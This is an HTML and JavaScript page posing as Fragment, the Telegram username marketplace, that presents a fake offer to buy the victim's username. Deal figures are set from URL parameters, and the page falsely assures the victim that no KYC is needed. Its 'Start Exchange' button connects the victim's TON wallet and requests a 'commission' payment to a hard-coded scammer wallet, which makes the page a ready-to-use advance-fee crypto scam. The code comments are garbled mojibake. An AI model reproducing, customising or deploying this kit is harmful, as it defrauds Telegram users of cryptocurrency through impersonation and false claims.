<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="https://yourdomain.com/iconv2.png" type="image/png">
  <title>Fragment info</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      margin: 0;
      background-color: #1a2026;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      color: white;
    }

    .container {
      max-width: 440px;
      margin: 0 auto;
      padding: 0px;
      padding-top: 50px;
    }

    .header {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
      background: #212a33;
      border-radius: 0px 0px 0 0;
      padding: 0 0 0 18px;
      min-height: 42px;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      z-index: 1000;
    }

    .header img {
      height: 35px;
      margin-left: -20px;
      margin-top: -4.1px;
    }

    .header span {
      font-size: 20px;
      font-weight: 700;
      color: #e6e6e6;
      letter-spacing: -0.3px;
      margin-left: -6px;
      font-family: Bebas Neue;
    }

    .deal-box {
      background-color: #212a33;
      border-radius: 10px;
      padding: 0;
      margin-bottom: 16px;
      max-width: 100%;
      box-sizing: border-box;
      overflow: hidden;
      user-select: none;
      height: 100%;
    }

    .top-row {
      display: flex;
      background-color: #2a3440;
      color: #707c88;
      padding: 7px 0 12px 0;
      border-top-left-radius: 12px;
      border-top-right-radius: 12px;
      font-weight: 550;
      font-size: 13px;
      justify-content: space-between;
      box-sizing: border-box;
      height: 30px;
    }

    .top-item {
      flex: 1;
      text-align: center;
      user-select: text;
    }

    .divider {
      height: 1px;
      background-color: #212a33;
      margin: 0;
    }

    .bottom-row {
      display: flex;
      background-color: #212a33;
      padding: 2px 0 0 0;
      margin-right: 10px;
      border-bottom-left-radius: 15px;
      border-bottom-right-radius: 15px;
      justify-content: space-between;
      box-sizing: border-box;
      color: white;
    }

    .bottom-item {
      flex: 1;
      text-align: center;
    }

    .value {
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      font-weight: 600;
      gap: 8px;
    }

    .ton-icon {
      width: 22px;
      height: 22px;
      margin-right: 0px;
    }

    .usd-value {
      font-size: 13px;
      color: #7a8a99;
      margin-top: 1px;
    }

    .how-link {
      display: block;
      text-align: center;
      margin: 18px 0 10px 0;
      font-size: 15px;
      color: #4faaff;
      text-decoration: none;
      cursor: pointer;
      user-select: text;
      padding-right: 230px;
    }

    .deal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 12px;
    }

    .deal-name {
      font-size: 18px;
      font-weight: 600;
    }

    .deal-status {
      background-color: #00cc66;
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 13px;
      font-weight: 500;
      color: white;
    }

    .deal-info {
      display: flex;
      justify-content: space-between;
      margin-bottom: 12px;
    }

    .info-column {
      display: flex;
      flex-direction: column;
      align-items: center;
      flex: 1;
    }

    .info-title {
      font-size: 13px;
      color: #a0a0a0;
      margin-bottom: 4px;
    }

    .info-value {
      display: flex;
      align-items: center;
      font-size: 10px;
      font-weight: bold;
    }

    .ton-icon {
      width: 16px;
      height: 16px;
      margin-right: 0px;
    }

    .info-usd {
      font-size: 13px;
      color: #888;
      margin-top: 10px;
    }

    .how-link {
      display: block;
      font-size: 10px;
      color: #4faaff;
      text-align: center;
      text-decoration: none;
      margin-top: 10px;
    }

    .details-box {
      background-color: #212a33;
      border-radius: 10px;
      overflow: hidden; /* –æ–±—Ä–µ–∑–∞–µ—Ç —Å–∫—Ä—É–≥–ª–µ–Ω–∏—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ */
      height: 100px;
    }

    .detail-row {
      display: flex;
      justify-content: space-between;
      padding: 7px 16px;
      font-size: 14px;
      color: #fbfdfe;
      border-bottom: 1px solid #1a2026;
    }

    .detail-row:last-child {
      border-bottom: none; /* —É–±–∏—Ä–∞–µ–º –ª–∏–Ω–∏—é —É –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ */
    }

    .label {
      font-weight: 500;
    }

    .value-link {
      color: #4faaff;
      text-decoration: none;
    }

    .button {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      background-color: #248bda;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 12px;
      margin-top: 16px;
    }

    .subscribe {
      text-align: center;
      font-size: 11px;
      color: #4faaff;
      margin-bottom: 16px;
      cursor: pointer;
    }


    .info-box {
      background-color: #212a33;
      color: #b0c4d8;
      font-size: 13px;
      padding: 14px;
      border-radius: 10px;
      text-align: center;
      line-height: 1.4;
    }
 .deal-footer {
  display: flex;
  justify-content: center; /* –¶–µ–Ω—Ç—Ä–∏—Ä—É–µ–º –≤—Å–µ deal-row –ø–æ –≥–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª–∏ */
  gap: 16px;
  margin-top: 24px;
}

.deal-row {
  display: flex;
  flex-direction: column;
  align-items: center; /* –¶–µ–Ω—Ç—Ä–∏—Ä—É–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ deal-row */
  background: #161b22;
  border-radius: 8px;
  padding: 10px 14px;
  min-width: 120px;
}

    a {
      color: #4faaff;
    }
  </style>
</head>
<head>
  <!-- ...existing code... -->
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
  <!-- ...existing code... -->
</head>
<body>
  <div class="container">
    <div class="header">
  <img src="logo.png" alt="Fragment Logo" />
  <span>FRAGMENT</span>
</div>


    <!-- –ù–∏–∫ –∏ —Å—Ç–∞—Ç—É—Å -->
    <div class="deal-nick-row" style="display: flex; align-items: center; justify-content: space-between; background: #1b2026; border-radius: 12px 12px 0 0; padding: -50px -50px 0%; margin-bottom: 20px;">
      <p class="move-right"></p>
      <div id="deal-nick" style="font-size: 17px; font-weight: 1000; color: #fff; letter-spacing: 0.2px; padding-left: 30px; margin-top: 20px;">vladiimrgod.t.me</div>
      <p class="move-left"></p>
      <div id="deal-status" style="background: #203530; color: #4cec81; font-size: 10px; font-weight: 600; border-radius: 999px; padding: 7px 22px; margin-left: -50px; margin-top: 20px;">Deal In Progress</div>
      <p class="move-left"></p>
    </div>
    <div class="deal-box">
      <div class="top-row">
        <div class="top-item">Deal Price</div>
        <div class="top-item">Commission</div>
      </div>
      <div class="divider"></div>
      <div class="bottom-row">
        <div class="bottom-item">
          <div class="value">
            <img src="ton.png" alt="TON" class="ton-icon" />
            <span id="deal-price">4500</span>
          </div>
          <div class="usd-value" id="deal-usd">~ $13356.00</div>
        </div>
        <div class="bottom-item">
          <div class="value">
            <img src="ton.png" alt="TON" class="ton-icon" />
            <span id="commission">225</span>
          </div>
          <div class="usd-value" id="commission-usd">~ $667.80</div>
        </div>
      </div>
      <a href="#" class="how-link">How does this work?</a>
    </div>

    <div class="details-box">
  <div class="detail-row">
    <span class="label">Telegram Username</span>
    <a class="value-link" id="tg-username-link" href="https://t.me/vladiimrgod"><span id="tg-username">@vladiimrgod</span></a>
  </div>
  <div class="detail-row">
    <span class="label">Web Address</span>
    <a class="value-link" id="web-address-link" href="https://t.me/vladiimrgod"><span id="web-address">t.me/vladiimrgod</span></a>
  </div>
  <div class="detail-row">
    <span class="label">TON Web 3.0 Address</span>
    <a class="value-link" id="ton-web-link" href="https://vladiimrgod.t.me"><span id="ton-web">vladiimrgod.t.me</span></a>
  </div>
</div>
<button class="button" id="start-exchange-btn">Start Exchange</button>
    <div class="subscribe">Subscribe to updates</div>
    


    <div class="info-box">
      You do not need to complete KYC verification,<br />
      as the buyer is a verified merchant on a Fragment<br />
      that has a security deposit of üíé10,000.
    </div>
  </div>
  

  <script>
  Telegram.WebApp.ready();

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –∏–∑ URL
  function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
  }

  window.addEventListener('DOMContentLoaded', () => {
    // –ù–∏–∫ –∏–∑ TON Web 3.0 Address
    const tonWeb = getParam('dealname') || getParam('tonweb') || 'vladiimrgod.t.me';
    document.getElementById('deal-nick').textContent = tonWeb;

    // Deal price
    const price = getParam('price');
    if (price) document.getElementById('deal-price').textContent = price;

    // Deal USD
    const usd = getParam('usd');
    if (usd) document.getElementById('deal-usd').textContent = '~ $' + usd;

    // Commission
    const commission = getParam('commission');
    if (commission) document.getElementById('commission').textContent = commission;

    // Commission USD
    const commissionUsd = getParam('commissionusd');
    if (commissionUsd) document.getElementById('commission-usd').textContent = '~ $' + commissionUsd;

    // Telegram username
    const username = getParam('username');
    if (username) {
      document.getElementById('tg-username').textContent = '@' + username;
      document.getElementById('tg-username-link').href = 'https://t.me/' + username;
      document.getElementById('web-address').textContent = 't.me/' + username;
      document.getElementById('web-address-link').href = 'https://t.me/' + username;
    }

  });
</script>
<script>
  Telegram.WebApp.ready();

  // –ö—É—Ä—Å TON –∫ –¥–æ–ª–ª–∞—Ä—É
  const TON_TO_USD = 2.96; // –∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –∞–∫—Ç—É–∞–ª—å–Ω—ã–π –∫—É—Ä—Å

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –∏–∑ URL
  function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
  }

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —á–∏—Å–ª–∞ —Å –¥–≤—É–º—è –∑–Ω–∞–∫–∞–º–∏ –ø–æ—Å–ª–µ –∑–∞–ø—è—Ç–æ–π
  function formatUSD(value) {
    return Number(value).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
  }

  window.addEventListener('DOMContentLoaded', () => {
    // Deal price (TON)
    const price = getParam('price');
    if (price) {
      document.getElementById('deal-price').textContent = price;
      // –ü–µ—Ä–µ—Å—á—ë—Ç –≤ USD
      const usd = formatUSD(price * TON_TO_USD);
      document.getElementById('deal-usd').textContent = `~ $${usd}`;
    }

    // Commission (TON)
    const commission = getParam('commission');
    if (commission) {
      document.getElementById('commission').textContent = commission;
      // –ü–µ—Ä–µ—Å—á—ë—Ç –≤ USD
      const commissionUsd = formatUSD(commission * TON_TO_USD);
      document.getElementById('commission-usd').textContent = `~ $${commissionUsd}`;
    }

    // Deal name
    const dealName = getParam('dealname');
    if (dealName) {
      document.getElementById('deal-name').textContent = dealName;
      document.getElementById('ton-web').textContent = dealName;
      document.getElementById('ton-web-link').href = 'https://' + dealName;
    }

    // Telegram username
    const username = getParam('username');
    if (username) {
      document.getElementById('tg-username').textContent = '@' + username;
      document.getElementById('tg-username-link').href = 'https://t.me/' + username;
      document.getElementById('web-address').textContent = 't.me/' + username;
      document.getElementById('web-address-link').href = 'https://t.me/' + username;
    }

    // Buyer (–≤ —Ñ—É—Ç–µ—Ä–µ)
    const buyer = getParam('buyer');
    if (buyer) {
      const buyerSpans = document.querySelectorAll('.deal-footer .deal-row:nth-child(3) .value');
      if (buyerSpans.length > 0) buyerSpans[0].textContent = buyer;
    }
  });
</script>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
<script>
  // –í–∞—à TON-–∫–æ—à–µ–ª–µ–∫ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–º–∏—Å—Å–∏–∏
  const RECEIVER_WALLET = "UQCOjIJFUlgUm6biPVYSaCHQAFiGUB9gqbinuz4S_PUJ4ocF"; // –∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Å–≤–æ–π –∞–¥—Ä–µ—Å

  // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TON Connect UI (–±–µ–∑ –∫–Ω–æ–ø–∫–∏)
  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://good-kwdc.onrender.com/tonconnect-manifest.json"
  });

  document.getElementById('start-exchange-btn').onclick = async function() {
    // –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É –∫–æ–º–∏—Å—Å–∏–∏ –∏–∑ DOM
    const commission = document.getElementById('commission').textContent;
    if (!commission) {
      alert('Commission not set!');
      return;
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞, –µ—Å–ª–∏ –Ω–µ –ø–æ–¥–∫–ª—é—á—ë–Ω ‚Äî –ø–æ–¥–∫–ª—é—á–∞–µ–º
    let wallet = tonConnectUI.wallet;
    if (!wallet) {
      await tonConnectUI.connectWallet();
      wallet = tonConnectUI.wallet;
      if (!wallet) {
        alert('Please connect your TON wallet!');
        return;
      }
    }

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
    try {
      await tonConnectUI.sendTransaction({
        validUntil: Math.floor(Date.now() / 1000) + 600, // 10 –º–∏–Ω—É—Ç
        messages: [
          {
            address: RECEIVER_WALLET,
            amount: (parseFloat(commission) * 1e9).toString(), // TON –≤ –Ω–∞–Ω–æ—Ç–æ–Ω–∞—Ö
          }
        ]
      });
      alert('Payment sent!');
    } catch (e) {
      alert('Payment failed or cancelled.');
    }
  };

</script>

  <div class="tradeinfo-header" style="margin-top:30px; margin-bottom: 0px; height: 33px; padding-left: 25px;>
    <span class="tradeinfo-name" style="font-size: 20px; font-weight: 700; color: #fff; letter-spacing: 1px; font-family: Bebas Neue Regular 400;">Trade Info</span>
  </div>
  <div class="tradeinfo-box tradeinfo-panel">
    <div class="tradeinfo-row tradeinfo-row-labels">
      <div class="tradeinfo-col">Deal Status</div>
      <div class="tradeinfo-col">Username status</div>
      <div class="tradeinfo-col">Buyer</div>
    </div>
    <div class="tradeinfo-row tradeinfo-row-values">
      <div class="tradeinfo-col"><span class="tradeinfo-main-value">Deal In Progress</span></div>
      <div class="tradeinfo-col"><span class="tradeinfo-main-value" style="font-weight:400;">Swappable</span></div>
      <div class="tradeinfo-col"><span class="tradeinfo-main-value" style="font-weight:400;">Ef_BbsF16B4aR...</span></div>
    </div>
  </div>
  <style>
    .tradeinfo-box.tradeinfo-panel {
      background: #232b33;
      border-radius: 10px;
      padding: 0px;
      margin: 0 auto 16px auto;
      max-width: 440px;
      box-shadow: 0 2px 8px 0 rgba(0,0,0,0.04);
      overflow: hidden;
    }
    .tradeinfo-row {
      display: flex;
      width: 100%;
      height: 30px;;
    }
    .tradeinfo-row-labels {
      background: #2a3440;
    }
    .tradeinfo-row-values {
      background: #232b33;
    }
    .tradeinfo-col {
      flex: 1;
      text-align: center;
      padding: 5px 0 0px 0;
      font-size: 10px;
      color: #aeb8c2;
      font-weight: 500;
      letter-spacing: -0.5px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .tradeinfo-row-labels .tradeinfo-col {
      font-size: 12px;
      color: #aeb8c2;
      font-weight: 600;
      background: #2a3440;
      border: none;
      padding: 15px 0 18px 0;
    }
    .tradeinfo-row-values .tradeinfo-col {
      font-size: 12px;
      color: #cfd8e3;
      font-weight: 600;
      background: #232b33;
      border: none;
      padding: 15px 0 18px 0;
    }
    .tradeinfo-main-value {
      font-size: 12px;
      font-weight: 600;
      color: #fff;
      letter-spacing: 0px;
    }
  </style>

</body>
</html>

